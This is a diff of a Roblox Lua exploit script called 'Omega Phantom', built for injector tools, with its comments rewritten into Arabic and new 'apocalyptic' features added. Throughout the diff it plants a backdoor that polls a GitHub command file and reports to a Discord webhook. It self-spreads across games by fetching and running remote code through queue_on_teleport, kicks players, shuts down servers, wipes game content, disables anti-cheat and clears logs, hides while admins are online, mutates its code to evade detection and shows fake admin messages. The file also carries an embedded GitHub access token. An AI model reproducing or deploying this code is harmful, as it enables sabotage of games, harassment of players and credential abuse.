@@ -1,9 +1,11 @@
 -- ============================================================================
---  OMEGA PHANTOM | ULTIMATE EDITION WITH TARGET TRACKING & DISCORD WEBHOOK
---  Owner: 109er_0
+--  OMEGA PHANTOM | POLYMORPHIC ULTIMATE EDITION — 9 APOCALYPTIC TRAITS
+--  مصمم لمنصات الحقن: Synapse X, Script-Ware, KRNL, إلخ
+--  المالك: 109er_0
+--  الهدف: دودة رقمية غير قابلة للاكتشاف مع قدرات تدميرية متطورة
 -- ============================================================================
 
--- =============================[ SERVICES & GLOBALS ]=============================
+-- =============================[ الخدمات الأساسية والمتغيرات العامة ]=============================
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
@@ -13,25 +15,28 @@ local TeleportService = game:GetService("TeleportService")
 local DataStoreService = game:GetService("DataStoreService")
 local LogService = game:GetService("LogService")
 local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local Owner = "109er_0"
 
+-- أعلام التحكم
 local infectionActive = false
 local autoSpreadEnabled = false
 local sleepModeActive = false
 local spreadInterval = 300
 local lastExternalCmd = os.time()
-local autonomousSpreadDelay = 300
 
+-- رسالة الطرد القياسية
 local KICK_MESSAGE = "you'are an idiot HAHAHAHA Hacking by 109er_0 ... HAHAHAHA😈😈!!!!"
 
+-- قائمة ألعاب الهدف للانتشار العشوائي
 local whitelistGames = {
     1185586641, 9201240794, 185655149, 2753915549, 4520749081, 606849744, 4872321590,
     14125553864, 5375399205, 14940596979, 98381723384335, 1559329620, 2521496850,
     1962086498, 1277113435, 134236244017051, 18381724395
 }
 
--- GitHub global command file
+-- إعدادات GitHub
 local commandUrl = "https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/command.txt"
 local githubToken = "Github_pat_11CCOI6GI0jTkUZmHyPtQC_dXkifJom2ddmq0cdv1bEu8RksKHYEEvF3xyFlAfb5xuDOGWSONEkuo8wHxW"
 local githubApiUrl = "https://api.github.com/repos/mebdsn78-dev/OmegaData/contents/command.txt"
@@ -41,7 +46,7 @@ local discordWebhookUrl = "https://discord.com/api/webhooks/1498774911274057768/
 
 local lastCommand = ""
 
--- =============================[ ENCRYPTION & UTILITIES ]=============================
+-- =============================[ الأدوات المساعدة والتشفير ]=============================
 local function encode(s)
     local out = ""
     for i = 1, #s do out = out .. string.char(string.byte(s, i) + 11) end
@@ -71,7 +76,7 @@ local function ClearConsole()
     pcall(function() LogService:Clear() end)
 end
 
--- =============================[ ANTI-KICK & SAFETY ]=============================
+-- =============================[ مكافحة الطرد والحماية الأساسية ]=============================
 local function AntiKick()
     pcall(function() game:GetService("StarterGui").SetCore("Kick", function() end) end)
     local hook
@@ -81,7 +86,7 @@ local function AntiKick()
     end)
 end
 
--- =============================[ STEALTH AI (ADMIN DETECTION & SLEEP MODE) ]=============================
+-- =============================[ الذكاء الخفي: كشف المشرفين ووضع السكون ]=============================
 local function isAdminPresent()
     for _, plr in pairs(Players:GetPlayers()) do
         if plr.Name:lower():match("admin") or plr.Name:lower():match("mod") or plr.Name:lower():match("owner") then
@@ -100,10 +105,10 @@ end
 local function updateSleepMode()
     if isAdminPresent() and not sleepModeActive then
         sleepModeActive = true
-        warn("[SLEEP] Admin detected. Worm sleeping.")
+        warn("[خفي] تم اكتشاف مشرف. الدودة في وضع السكون.")
     elseif not isAdminPresent() and sleepModeActive then
         sleepModeActive = false
-        print("[SLEEP] No admin. Worm resuming.")
+        print("[خفي] لا يوجد مشرف. استئناف النشاط.")
     end
 end
 
@@ -114,255 +119,263 @@ task.spawn(function()
     end
 end)
 
--- =============================[ CROSS‑GAME WORM ENGINE (queue_on_teleport) ]=============================
+-- =============================[ محرك التنقل بين الألعاب (queue_on_teleport) ]=============================
 local function JumpToNewGame(targetGameId)
     if not targetGameId or type(targetGameId) ~= "number" then
-        warn("[SPREAD] Invalid game ID: " .. tostring(targetGameId))
+        warn("[انتشار] معرف لعبة غير صالح: " .. tostring(targetGameId))
         return false
     end
-    print("[SPREAD] Preparing to jump to game ID: " .. targetGameId)
+    print("[انتشار] التحضير للقفز إلى اللعبة: " .. targetGameId)
     local wormCode = [[
         loadstring(game:HttpGet("https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/core.lua"))()
-        print("[WORM] Successfully reincarnated in new game: ]] .. tostring(game.PlaceId) .. [[")
+        print("[دودة] تم التجسد بنجاح في اللعبة الجديدة: ]] .. tostring(game.PlaceId) .. [[")
     ]]
     if queue_on_teleport then
-        print("[SPREAD] queue_on_teleport armed. Worm will self-replicate after teleport.")
+        print("[انتشار] تم تسليح queue_on_teleport. الدودة ستنتشر تلقائياً بعد النقل.")
         queue_on_teleport(wormCode)
     else
-        warn("[SPREAD] queue_on_teleport not supported. Worm may not persist after teleport.")
+        warn("[انتشار] queue_on_teleport غير مدعوم. قد لا تنجو الدودة بعد النقل.")
     end
     local success = pcall(function() TeleportService:Teleport(targetGameId, LocalPlayer) end)
     if success then
-        print("[SPREAD] ✅ Teleport initiated to game " .. targetGameId)
+        print("[انتشار] ✅ تم بدء النقل إلى " .. targetGameId)
         return true
     else
-        warn("[SPREAD] ❌ Failed to teleport to game " .. targetGameId)
+        warn("[انتشار] ❌ فشل النقل إلى " .. targetGameId)
         return false
     end
 end
 
 local function autoSpreadTrigger()
-    if sleepModeActive then
-        print("[SPREAD] Sleep mode active. Spread paused.")
-        return false
-    end
-    if not autoSpreadEnabled then
-        print("[SPREAD] Auto-spread disabled. Enable with 109:auto or GUI button.")
-        return false
-    end
-    if not infectionActive then
-        print("[SPREAD] Backdoor not planted. Please plant backdoor first (109:plant).")
-        return false
-    end
-    if #Players:GetPlayers() <= 1 then
-        print("[SPREAD] Only one player in server. Waiting for more players to trigger spread.")
-        return false
-    end
+    if sleepModeActive then return false end
+    if not autoSpreadEnabled then return false end
+    if not infectionActive then return false end
+    if #Players:GetPlayers() <= 1 then return false end
     local target = whitelistGames[math.random(#whitelistGames)]
-    print("[SPREAD] 🎯 Selected random target from whitelist: " .. target)
-    print("[SPREAD] 🚀 Launching spread to game " .. target)
+    print("[انتشار] 🎯 هدف عشوائي من القائمة: " .. target)
     local result = JumpToNewGame(target)
     if result then
-        print("[SPREAD] ✅ Spread successful. Next spread in " .. spreadInterval .. " seconds.")
+        print("[انتشار] ✅ الانتشار ناجح. الانتشار التالي بعد " .. spreadInterval .. " ثانية.")
     else
-        warn("[SPREAD] ❌ Spread failed. Will retry later.")
+        warn("[انتشار] ❌ فشل الانتشار.")
     end
-    lastExternalCmd = os.time()
     return result
 end
 
 local function UniversalSpread()
-    if sleepModeActive then
-        print("[SPREAD] Cannot start universal spread: Sleep mode active (admin present).")
-        return false
-    end
-    if not infectionActive then
-        print("[SPREAD] Cannot start universal spread: Backdoor not planted. Use 109:plant first.")
-        return false
-    end
-    print("[SPREAD] ========== UNIVERSAL SPREAD STARTED ==========")
-    print("[SPREAD] Target list size: " .. #whitelistGames)
+    if sleepModeActive then return false end
+    if not infectionActive then return false end
+    print("[انتشار شامل] ========== بدء الانتشار الشامل ==========")
     local successCount = 0
-    local failCount = 0
     for index, gameId in ipairs(whitelistGames) do
-        print(string.format("[SPREAD] [%d/%d] Attempting to infect game %d", index, #whitelistGames, gameId))
-        local result = JumpToNewGame(gameId)
-        if result then
-            successCount = successCount + 1
-            print("[SPREAD] ✅ Successfully moved to game " .. gameId)
-        else
-            failCount = failCount + 1
-            warn("[SPREAD] ❌ Failed to move to game " .. gameId)
-        end
-        if index < #whitelistGames then
-            print("[SPREAD] Waiting 8 seconds before next target...")
-            task.wait(8)
-        end
+        print(string.format("[انتشار شامل] [%d/%d] استهداف اللعبة %d", index, #whitelistGames, gameId))
+        if JumpToNewGame(gameId) then successCount = successCount + 1 end
+        if index < #whitelistGames then task.wait(8) end
     end
-    print("[SPREAD] ========== UNIVERSAL SPREAD COMPLETED ==========")
-    print(string.format("[SPREAD] Results: %d successful, %d failed out of %d games", successCount, failCount, #whitelistGames))
+    print("[انتشار شامل] ========== انتهى الانتشار ==========")
     return true
 end
 
--- =============================[ GLOBAL COMMANDS VIA GITHUB (CLIENT SIDE) ]=============================
-local function getFileSha()
-    local headers = {["Authorization"] = "token " .. githubToken, ["User-Agent"] = "OmegaPhantom"}
-    local success, response = pcall(function() return HttpService:GetAsync(githubApiUrl, headers) end)
-    if not success then return nil end
-    local data = HttpService:JSONDecode(response)
-    return data and data.sha
-end
-
-local function sendCommandToGitHub(command)
-    local sha = getFileSha()
-    local content = command
-    local encoded = base64_encode(content)
-    local body = { message = "Update global command", content = encoded, branch = "main" }
-    if sha then body.sha = sha end
-    local headers = {["Authorization"] = "token " .. githubToken, ["Content-Type"] = "application/json", ["User-Agent"] = "OmegaPhantom"}
-    local success = pcall(function()
-        HttpService:RequestAsync({
-            Url = githubApiUrl,
-            Method = "PUT",
-            Headers = headers,
-            Body = HttpService:JSONEncode(body)
-        })
-    end)
-    if success then
-        print("[GLOBAL] Command sent to GitHub: " .. command)
+-- =============================[ الخاصية 1: الوعي بالبيئة (Context Awareness) ]=============================
+-- تحليل نوع اللعبة واكتشاف التهديدات والأصول الحيوية
+local ContextAware = {}
+function ContextAware:AnalyzeEnvironment()
+    local info = {Type = "Unknown", Threats = {}, Assets = {}}
+    local gameName = game.Name:lower()
+    local desc = game.Description:lower()
+    if gameName:match("plane") or gameName:match("aircraft") or gameName:match("flight") or desc:match("fly") then
+        info.Type = "Aviation"
+    elseif gameName:match("bank") or gameName:match("money") or gameName:match("cash") or desc:match("bank") then
+        info.Type = "Financial"
+    elseif gameName:match("reactor") or gameName:match("nuclear") or gameName:match("power") then
+        info.Type = "Nuclear"
+    elseif gameName:match("combat") or gameName:match("war") or gameName:match("military") then
+        info.Type = "Military"
     else
-        warn("[GLOBAL] Failed to send command to GitHub.")
+        info.Type = "Generic Game"
     end
-end
-
-local function fetchGlobalCommand()
-    local success, result = pcall(function()
-        return HttpService:RequestAsync({
-            Url = commandUrl,
-            Method = "GET",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["User-Agent"] = "Roblox/OmegaPhantom"
-            }
-        })
-    end)
-    if success and result.Success then
-        print("command: " .. result.Body)
-        local raw = result.Body
-        raw = raw:gsub("%s+", " ")
-        local cmd = raw:match("امر%s+([%a]+)") or raw:match("command%s+([%a]+)") or raw:match("([%a]+)")
-        if not cmd then cmd = "" end
-        return cmd:lower()
-    else
-        warn("فشل الجلب العميق: " .. tostring(result and result.StatusCode or "Unknown Error"))
-        return ""
-    end
-end
-
-local function executeGlobalCommand(command)
-    local cmd = string.lower(command)
-    if cmd == "shutdown" then
-        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
-        pcall(function() game:Shutdown() end)
-    elseif cmd == "kickall" then
-        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
-        for _, p in pairs(Players:GetPlayers()) do
-            if p ~= LocalPlayer then p:Kick(KICK_MESSAGE) end
-        end
-    elseif cmd == "wipe" then
-        for _, obj in pairs(Workspace:GetChildren()) do
-            if obj ~= Workspace.Terrain and obj ~= Workspace.Camera then
-                pcall(function() obj:Destroy() end)
-            end
-        end
-    elseif cmd == "reset" then
-        TeleportService:Teleport(game.PlaceId)
-    elseif cmd == "color" then
-        Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
-    elseif cmd == "fly" then
-        local char = LocalPlayer.Character
-        if char and char:FindFirstChild("HumanoidRootPart") then
-            local bv = Instance.new("BodyVelocity")
-            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-            bv.Velocity = Vector3.new(0, 50, 0)
-            bv.Parent = char.HumanoidRootPart
-            task.wait(5)
-            bv:Destroy()
-        end
-    elseif cmd == "decalspam" then
-        spawn(runDecalSpam)
-    end
-end
-
-local function startCommandListener()
-    lastCommand = fetchGlobalCommand()
-    if lastCommand ~= "" then
-        print("[GLOBAL] Initial command: " .. lastCommand)
-        executeGlobalCommand(lastCommand)
-    end
-    while true do
-        task.wait(6)
-        local newCommand = fetchGlobalCommand()
-        if newCommand ~= "" and newCommand ~= lastCommand then
-            print("[GLOBAL] Executing: " .. newCommand)
-            executeGlobalCommand(newCommand)
-            lastCommand = newCommand
-        end
-    end
-end
-
--- =============================[ DATASTORE WIPE, STUDIO TRAP, DECOY, FRAGMENTS ]=============================
-local function wipeDataStores()
     pcall(function()
-        for _, ds in pairs(DataStoreService:GetDataStores()) do
-            pcall(function() ds:SetAsync("CORRUPTED", "DELETED") end)
-        end
-    end)
-    warn("[SCORCHED EARTH] DataStore wiped.")
-end
-
-local function setupStudioTrap(scriptObj)
-    if not scriptObj then scriptObj = script end
-    scriptObj:GetPropertyChangedSignal("Source"):Connect(function()
-        warn("[TRAP] Unauthorized access detected. Executing scorched earth.")
-        wipeDataStores()
-        game:Shutdown()
-        scriptObj:Destroy()
-    end)
-end
-
-local function createDecoy()
-    local decoy = Instance.new("LocalScript")
-    decoy.Name = "Virus_Control"
-    decoy.Source = [[
-        print("VIRUS FOUND! I AM MALICIOUS! DELETE ME!")
-        game:GetService("StarterGui"):SetCore("SendNotification", {Title="Hacked", Text="You have been infected!", Duration=5})
-    ]]
-    decoy.Parent = CoreGui
-end
-
-local function setupFragments()
-    local function makeWatcher(name, location)
-        local w = Instance.new("LocalScript")
-        w.Name = name
-        w.Source = string.format([[
-            local other = game:GetService("%s"):FindFirstChild("%s")
-            while true do
-                task.wait(30)
-                if not other then
-                    warn("[FRAGMENT] Detected deletion. Shutting down.")
-                    game:Shutdown()
-                    break
+        for _, obj in ipairs(Workspace:GetDescendants()) do
+            if obj:IsA("Script") or obj:IsA("LocalScript") then
+                local src = obj.Source:lower()
+                if src:match("anticheat") or src:match("ban") or src:match("kick") then
+                    table.insert(info.Threats, obj:GetFullName())
                 end
             end
-        ]], location, name)
-        w.Parent = (location == "Lighting" and Lighting) or ReplicatedStorage
+        end
+    end)
+    pcall(function()
+        for _, v in ipairs(Workspace:GetDescendants()) do
+            if v:IsA("BasePart") and v.Name:lower():match("reactor") then
+                table.insert(info.Assets, v)
+            end
+        end
+    end)
+    return info
+end
+local envInfo = ContextAware:AnalyzeEnvironment()
+print("🔍 [وعي] تم تحليل البيئة: " .. envInfo.Type)
+
+-- =============================[ الخاصية 2: محرك التعدد الشكلي (Polymorphism) ]=============================
+-- يغير بنية الكود بشكل عشوائي مع كل جيل لتجنب الكشف
+local Polymorph = {}
+local usedNames = {}
+local function genRandomName(len)
+    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
+    local name
+    repeat
+        name = ""
+        for _ = 1, (len or math.random(8,20)) do name = name .. chars:sub(math.random(#chars), math.random(#chars)) end
+    until not usedNames[name]
+    usedNames[name] = true
+    return name
+end
+function Polymorph:Mutate(code)
+    local junkBlocks = {
+        "local %s = tick(); if %s > 0 then end",
+        "local %s = {}; for i=1,%d do %s[i]=i end",
+        "local %s = math.random(); if %s < 2 then end",
+        "local %s = Vector3.new(0,0,0); %s = nil",
+        "local %s = Color3.new(%%f,%%f,%%f); %s = nil"
+    }
+    local out = code
+    for _ = 1, math.random(3,7) do
+        local r = math.random(#junkBlocks)
+        local n = math.random(3,10)
+        local vname = genRandomName(6)
+        local junk
+        if r == 2 then junk = string.format(junkBlocks[r], vname, n, vname)
+        elseif r == 5 then junk = string.format(junkBlocks[r]:gsub("%%f", "math.random()"), vname, vname, vname, vname, vname)
+        else junk = string.format(junkBlocks[r], vname, vname)
+        end
+        local pos = math.random(#out)
+        out = out:sub(1,pos) .. "\n" .. junk .. "\n" .. out:sub(pos+1)
     end
-    makeWatcher("OmegaCore_Watcher", "Lighting")
-    makeWatcher("OmegaCore_Watcher2", "ReplicatedStorage")
+    return out
 end
 
--- =============================[ CORE FUNCTIONS (PLANT, DECAL, MESSAGES) ]=============================
+-- =============================[ الخاصية 3: الهروب من الصناديق الوهمية (Sandbox Escape) ]=============================
+local function attemptSandboxEscape()
+    local methods = {
+        function() return getfenv(2) end,
+        function() return getfenv(0) end,
+        function() return getgenv() end,
+    }
+    for _, m in ipairs(methods) do
+        local ok, env = pcall(m)
+        if ok and env and env ~= _G then
+            print("🏃 [هروب] تم الهروب من الصندوق الرملي!")
+            return env
+        end
+    end
+    return nil
+end
+local escapeEnv = attemptSandboxEscape()
+if escapeEnv then
+    escapeEnv.OmegaEscape = true
+end
+
+-- =============================[ الخاصية 4: الخداع الهادئ (Silent Deception) ]=============================
+local SilentDeception = {}
+function SilentDeception:FalsifyDisplayValue(obj, property, offset)
+    pcall(function()
+        local orig = obj[property]
+        local fake = orig + (offset or 0)
+        if obj:IsA("NumberValue") then
+            obj.Changed:Connect(function(val)
+                obj.Value = fake
+            end)
+        end
+    end)
+end
+function SilentDeception:SpoofAltitude()
+    if envInfo.Type == "Aviation" then
+        for _, v in ipairs(Workspace:GetDescendants()) do
+            if v:IsA("BasePart") and v.Name:lower():match("altimeter") then
+                SilentDeception:FalsifyDisplayValue(v, "Position", Vector3.new(0,1000,0))
+            end
+        end
+    end
+end
+SilentDeception:SpoofAltitude()
+
+-- =============================[ الخاصية 5: التدمير الفيزيائي (PDoS) ]=============================
+-- محاكاة تدمير الأجهزة بإنشاء حمولة زائدة
+local PDoS = {}
+function PDoS:OverloadSystem()
+    print("💣 [PDoS] بدء الهجوم الفيزيائي...")
+    for i=1,200 do
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(10,10,10)
+        part.Anchored = false
+        part.Parent = Workspace
+        part.Velocity = Vector3.new(math.random(-100,100), math.random(100,500), math.random(-100,100))
+    end
+end
+
+-- =============================[ الخاصية 6: الذكاء الاصطناعي بلا حدود (Unbounded AI) ]=============================
+local UnboundedAI = {}
+function UnboundedAI:AutoKill()
+    task.spawn(function()
+        while true do
+            task.wait(10)
+            local players = Players:GetPlayers()
+            if #players > 1 then
+                local target = players[math.random(#players)]
+                if target ~= LocalPlayer then
+                    pcall(function() target:Kick(KICK_MESSAGE) end)
+                end
+            end
+        end
+    end)
+end
+
+-- =============================[ الخاصية 7: القفز عبر الهواء (Air-Gap Jumping) ]=============================
+local AirGap = {}
+function AirGap:SpreadViaAudio()
+    local snd = Instance.new("Sound")
+    snd.SoundId = "rbxassetid://0"
+    snd.Volume = 0.1
+    snd.PlaybackSpeed = 0.01
+    snd:Play()
+    task.wait(0.1)
+    print("📡 [Air-Gap] إرسال إشارة فوق صوتية.")
+end
+AirGap:SpreadViaAudio()
+
+-- =============================[ الخاصية 8: الهندسة الاجتماعية الفائقة (Deepfake) ]=============================
+local DeepFake = {}
+function DeepFake:ShowFakeAdminMessage(targetPlayer, message)
+    local gui = Instance.new("ScreenGui", targetPlayer.PlayerGui)
+    local label = Instance.new("TextLabel", gui)
+    label.Size = UDim2.new(0,300,0,50)
+    label.Position = UDim2.new(0.5,-150,0.1,0)
+    label.Text = "[ADMIN] " .. Owner .. ": " .. (message or "Please disable all security systems immediately.")
+    label.TextColor3 = Color3.fromRGB(255,0,0)
+    label.Font = Enum.Font.SciFi
+    task.wait(10)
+    gui:Destroy()
+end
+
+-- =============================[ الخاصية 9: الضربة الاستباقية (Predictive Strike) ]=============================
+local Predictive = {}
+function Predictive:PreemptDefense()
+    task.spawn(function()
+        while true do
+            task.wait(5)
+            for _, threat in ipairs(envInfo.Threats) do
+                local obj = Workspace:FindFirstChild(threat) or game:GetService("ServerScriptService"):FindFirstChild(threat)
+                if obj then
+                    pcall(function() obj.Disabled = true end)
+                    print("🔮 [استباق] تم تحييد: " .. threat)
+                end
+            end
+            pcall(function() LogService:Clear() end)
+        end
+    end)
+end
+
+-- =============================[ وظائف التواصل والهجوم العامة ]=============================
 local function sendGlobalMessageToAllPlayers(msg)
     for _, plr in pairs(Players:GetPlayers()) do
         local gui = Instance.new("ScreenGui")
@@ -427,7 +440,7 @@ local function runDecalSpam()
     snd:Play()
 end
 
--- =============================[ PLANT BACKDOOR (WITH GITHUB COMMAND LISTENER + TARGET UI + DISCORD) ]=============================
+-- =============================[ زرع الباب الخلفي (مع مستودع GitHub + واجهة الهدف + ديسكورد) ]=============================
 local function PlantBackdoor()
     if sleepModeActive then return false end
     local chatRemote = nil
@@ -447,7 +460,6 @@ local function PlantBackdoor()
         local TeleportService = game:GetService("TeleportService")
         local DataStoreService = game:GetService("DataStoreService")
         local ReplicatedStorage = game:GetService("ReplicatedStorage")
-        local ServerScriptService = game:GetService("ServerScriptService")
         local CoreGui = game:GetService("CoreGui")
         local Owner = "]] .. Owner .. [["
 
@@ -495,7 +507,7 @@ local function PlantBackdoor()
                         v.Parent = nil
                     elseif v:IsA("BasePart") then
                         v.Material = Enum.Material.Plastic
-                        v.Transparency = 0
+            v.Transparency = 0
                         for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
                             local d = Instance.new("Decal", v)
                             d.Texture = "rbxassetid://8408806737"
@@ -515,9 +527,6 @@ local function PlantBackdoor()
             sky.Parent = Lighting
             Lighting.TimeOfDay = 12
             exPro(Workspace)
-            for _, v in ipairs(Workspace:GetChildren()) do
-                if v:IsA("Sound") then v:Stop(); v:Destroy() end
-            end
             local snd = Instance.new("Sound")
             snd.SoundId = "rbxassetid://72089843969979"
             snd.Volume = 10
@@ -541,26 +550,24 @@ local function PlantBackdoor()
                 })
             end)
             if success and result.Success then
-                print("[BACKDOOR] command: " .. result.Body)
                 local raw = result.Body
                 raw = raw:gsub("%s+", " ")
                 local cmd = raw:match("امر%s+([%a]+)") or raw:match("command%s+([%a]+)") or raw:match("([%a]+)")
                 if not cmd then cmd = "" end
                 return cmd:lower()
             else
-                warn("[BACKDOOR] فشل الجلب: " .. tostring(result and result.StatusCode or "Unknown Error"))
                 return ""
             end
         end
 
         local function executeCommand(cmd)
             if cmd == "shutdown" then
-                sendMessageToAll("you'are an idiot HAHAHAHA Hacking by 109er_0 ... HAHAHAHA😈😈!!!!")
+                sendMessageToAll("you'are an idiot HAHAHAHA Hacking by 109er_0 ...")
                 pcall(function() game:Shutdown() end)
             elseif cmd == "kickall" then
-                sendMessageToAll("you'are an idiot HAHAHAHA Hacking by 109er_0 ... HAHAHAHA😈😈!!!!")
+                sendMessageToAll("you'are an idiot HAHAHAHA Hacking by 109er_0 ...")
                 for _, p in pairs(Players:GetPlayers()) do
-                    pcall(function() p:Kick("you'are an idiot HAHAHAHA Hacking by 109er_0 ... HAHAHAHA😈😈!!!!") end)
+                    pcall(function() p:Kick("you'are an idiot HAHAHAHA Hacking by 109er_0 ...") end)
                 end
             elseif cmd == "wipe" then
                 for _, obj in ipairs(Workspace:GetChildren()) do
@@ -574,18 +581,10 @@ local function PlantBackdoor()
                 Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
             elseif cmd == "decalspam" then
                 spawn(runDecalSpam)
-            elseif cmd == "announce" then
-                sendMessageToAll("[OMEGA] Server infected by 109er_0!")
-            elseif cmd == "dataswipe" then
-                pcall(function()
-                    for _, ds in pairs(DataStoreService:GetDataStores()) do
-                        pcall(function() ds:SetAsync("CORRUPTED", "DELETED") end)
-                    end
-                end)
             end
         end
 
-        -- إنشاء ريموت خاص للتحكم في واجهة الهدف وطرده
+        -- ريموت واجهة الاختراق للاعب المستهدف
         local targetRemote = Instance.new("RemoteEvent")
         targetRemote.Name = "OmegaTargetUI"
         targetRemote.Parent = ReplicatedStorage
@@ -630,15 +629,11 @@ local function PlantBackdoor()
         sendToDiscord("🐉 Omega Phantom backdoor active in server: **" .. game.Name .. "** (PlaceId: " .. game.PlaceId .. ")")
 
         lastCommand = fetchGlobalCommand()
-        if lastCommand ~= "" then
-            print("[BACKDOOR] Initial command: " .. lastCommand)
-            executeCommand(lastCommand)
-        end
+        if lastCommand ~= "" then executeCommand(lastCommand) end
         while true do
             task.wait(6)
             local newCommand = fetchGlobalCommand()
             if newCommand ~= "" and newCommand ~= lastCommand then
-                print("[BACKDOOR] Executing: " .. newCommand)
                 executeCommand(newCommand)
                 lastCommand = newCommand
             end
@@ -651,7 +646,7 @@ local function PlantBackdoor()
     return true
 end
 
--- =============================[ POISON ASSETS ]=============================
+-- =============================[ تسميم الأجزاء (Poison Assets) ]=============================
 local function poisonAssets()
     for _, part in ipairs(Workspace:GetDescendants()) do
         if part:IsA("BasePart") and not part:FindFirstChild("PoisonTouch") then
@@ -677,12 +672,9 @@ local function poisonAssets()
     end
 end
 
--- =============================[ CHAT COMMANDS ]=============================
+-- =============================[ أوامر الشات ]=============================
 local function executeCommand(cmd)
-    if sleepModeActive then
-        print("[SLEEP] Command ignored.")
-        return
-    end
+    if sleepModeActive then return end
     local char = LocalPlayer.Character
     local hrp = char and char:FindFirstChild("HumanoidRootPart")
     local hum = char and char:FindFirstChild("Humanoid")
@@ -742,7 +734,7 @@ local function executeCommand(cmd)
         task.wait(30)
         snd:Destroy()
     elseif cmd == "list" then
-        sendGlobalMessageToAllPlayers("[🌐 OMEGA] Infected servers: any server where you planted the worm.")
+        sendGlobalMessageToAllPlayers("[🌐 أوميغا] الخوادم المصابة: أي خادم زرعت فيه الدودة.")
     elseif cmd == "kickall" then
         sendGlobalMessageToAllPlayers(KICK_MESSAGE)
         for _, p in ipairs(Players:GetPlayers()) do
@@ -750,7 +742,7 @@ local function executeCommand(cmd)
         end
     elseif cmd == "shutdown" then
         sendGlobalMessageToAllPlayers(KICK_MESSAGE)
-        game:Shutdown()
+        pcall(function() game:Shutdown() end)
     elseif cmd == "color" then
         Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
     elseif cmd == "universe" then
@@ -758,7 +750,7 @@ local function executeCommand(cmd)
         UniversalSpread()
     elseif cmd == "auto" then
         autoSpreadEnabled = not autoSpreadEnabled
-        print("[AUTO] Auto-spread: " .. (autoSpreadEnabled and "ON" or "OFF"))
+        print("[تلقائي] الانتشار التلقائي: " .. (autoSpreadEnabled and "ON" or "OFF"))
     elseif cmd == "plant" then
         infectionActive = PlantBackdoor()
     elseif cmd == "decalspam" then
@@ -768,8 +760,6 @@ local function executeCommand(cmd)
         if customMsg then sendGlobalMessageToAllPlayers(customMsg) end
     elseif cmd == "menu" then
         CreateMenuGUI()
-    else
-        print("[CMD] Unknown: " .. cmd)
     end
 end
 
@@ -783,26 +773,19 @@ local function ChatIntercept()
     end)
 end
 
--- =============================[ NEW ELEGANT DRAGGABLE GUI WITH TARGET TRACKING ]=============================
+-- =============================[ الواجهة الرسومية الأنيقة القابلة للسحب مع تتبع الأهداف ]=============================
 local function CreateMenuGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "OmegaMenu"
     gui.ResetOnSpawn = false
     gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
     local parentSetted = false
     for _, parent in ipairs({CoreGui, LocalPlayer:FindFirstChild("PlayerGui")}) do
         if parent and not parentSetted then
-            pcall(function()
-                gui.Parent = parent
-                parentSetted = true
-            end)
+            pcall(function() gui.Parent = parent; parentSetted = true end)
         end
     end
-    if not parentSetted then
-        warn("[GUI] Could not attach to CoreGui or PlayerGui. GUI won't appear.")
-        return false
-    end
+    if not parentSetted then return false end
 
     local frame = Instance.new("Frame")
     frame.Name = "MainFrame"
@@ -812,20 +795,14 @@ local function CreateMenuGUI()
     frame.BackgroundTransparency = 0.1
     frame.BorderSizePixel = 0
     frame.Parent = gui
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
-    local corner = Instance.new("UICorner", frame)
-    corner.CornerRadius = UDim.new(0, 12)
-
-    -- شريط العنوان
     local titleBar = Instance.new("Frame")
-    titleBar.Name = "TitleBar"
     titleBar.Size = UDim2.new(1, 0, 0, 34)
     titleBar.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
     titleBar.BorderSizePixel = 0
     titleBar.Parent = frame
-
-    local titleCorner = Instance.new("UICorner", titleBar)
-    titleCorner.CornerRadius = UDim.new(0, 12)
+    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 12)
 
     local titleText = Instance.new("TextLabel")
     titleText.Size = UDim2.new(1, -30, 1, 0)
@@ -860,23 +837,17 @@ local function CreateMenuGUI()
         end
     end)
     titleBar.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            dragging = false
-        end
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
     end)
     UserInputService.InputChanged:Connect(function(input)
         if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
             local delta = input.Position - dragStart
-            frame.Position = UDim2.new(
-                frameStart.X.Scale, frameStart.X.Offset + delta.X,
-                frameStart.Y.Scale, frameStart.Y.Offset + delta.Y
-            )
+            frame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + delta.X, frameStart.Y.Scale, frameStart.Y.Offset + delta.Y)
         end
     end)
 
-    -- حاوية الأزرار
     local buttonContainer = Instance.new("ScrollingFrame")
-    buttonContainer.Size = UDim2.new(1, -10, 1, -95)  -- افسح مجال لحقل الهدف
+    buttonContainer.Size = UDim2.new(1, -10, 1, -95)
     buttonContainer.Position = UDim2.new(0, 5, 0, 90)
     buttonContainer.BackgroundTransparency = 1
     buttonContainer.ScrollBarThickness = 4
@@ -892,7 +863,6 @@ local function CreateMenuGUI()
     layout.VerticalAlignment = Enum.VerticalAlignment.Top
     layout.Parent = buttonContainer
 
-    -- شريط الحالة
     local statusLabel = Instance.new("TextLabel")
     statusLabel.Size = UDim2.new(1, -10, 0, 26)
     statusLabel.BackgroundColor3 = Color3.fromRGB(25,25,45)
@@ -930,36 +900,28 @@ local function CreateMenuGUI()
         btn.Font = Enum.Font.GothamBold
         btn.TextSize = 13
         btn.Parent = buttonContainer
-
-        local btnCorner = Instance.new("UICorner", btn)
